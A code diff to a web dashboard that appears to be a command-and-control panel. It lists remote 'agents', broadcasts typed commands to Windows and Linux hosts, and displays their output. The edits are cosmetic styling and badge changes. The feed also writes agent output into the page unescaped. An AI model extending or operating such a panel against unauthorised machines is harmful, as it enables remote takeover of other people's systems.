@@ -17,9 +17,10 @@
         .status-offline { color: #ff4444; }
         .badge-pending { color: #ff9800; border: 1px solid #ff9800; padding: 2px 5px; font-size: 0.7rem; }
         .text-neon { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
-        .seen-text { color: #0dcaf0; font-size: 0.75rem; } /* Brighter Cyan for readability */
-        pre { margin: 0; white-space: pre-wrap; color: #00ff41; }
+        .seen-text { color: #0dcaf0; font-size: 0.75rem; font-weight: bold; } 
+        pre { margin: 0; white-space: pre-wrap; color: #00ff41; background: transparent; border: none; padding: 0; }
         hr { border-color: #333; }
+        .badge-os { font-size: 0.6rem; text-transform: uppercase; }
     </style>
 </head>
 <body class="p-4">
@@ -56,14 +57,14 @@
                     <h6 class="text-muted">INSTRUCTION_UPLINK</h6>
                     <form id="cmd-form">
                         <div class="input-group">
-                            <select name="target" id="target-select" class="form-select bg-dark text-white" style="max-width: 250px;">
+                            <select name="target" id="target-select" class="form-select bg-dark text-white border-secondary" style="max-width: 250px;">
                                 <option value="ALL">BROADCAST_ALL</option>
                                 <option value="BROADCAST_WINDOWS">BROADCAST_WINDOWS</option>
                                 <option value="BROADCAST_LINUX">BROADCAST_LINUX</option>
                                 <optgroup label="WINDOWS_ASSETS" id="opt-windows"></optgroup>
                                 <optgroup label="LINUX_ASSETS" id="opt-linux"></optgroup>
                             </select>
-                            <input type="text" name="command" class="form-control bg-dark text-white" placeholder="ENTER COMMAND..." required>
+                            <input type="text" name="command" class="form-control bg-dark text-white border-secondary" placeholder="ENTER COMMAND..." required>
                             <button class="btn btn-outline-success">TRANSMIT_CMD</button>
                         </div>
                     </form>
@@ -129,12 +130,11 @@
                     </tr>`;
 
                     const opt = `<option value="${agent.hostname}">${agent.hostname}</option>`;
-                    if (agent.os.includes("Windows")) selectWin.innerHTML += opt;
+                    if (agent.os.toLowerCase().includes("windows")) selectWin.innerHTML += opt;
                     else selectLin.innerHTML += opt;
                 });
                 document.getElementById('target-select').value = savedVal;
 
-                // Update Queue
                 const qList = document.getElementById('queue-list');
                 qList.innerHTML = '';
                 data.queue.forEach(task => {
@@ -144,7 +144,6 @@
                     </div>`;
                 });
 
-                // Update Results
                 const resFeed = document.getElementById('results-feed');
                 data.results.forEach(res => {
                     if (!seenResultIds.has(res.id)) {
@@ -152,9 +151,10 @@
                         const div = document.createElement('div');
                         div.className = "feed-item mb-3";
                         div.setAttribute('data-os', res.os);
+                        const badgeClass = res.os === 'Windows' ? 'bg-primary' : (res.os === 'Linux' ? 'bg-warning text-dark' : 'bg-secondary');
                         div.innerHTML = `
                             <span class="text-muted">[${res.timestamp}]</span> 
-                            <span class="badge ${res.os === 'Windows' ? 'bg-primary' : 'bg-warning text-dark'}" style="font-size: 0.6rem;">${res.os}</span>
+                            <span class="badge badge-os ${badgeClass}">${res.os}</span>
                             <span class="text-info"> ${res.hostname} ></span> 
                             <pre>${res.output}</pre><hr>`;
                         resFeed.prepend(div);
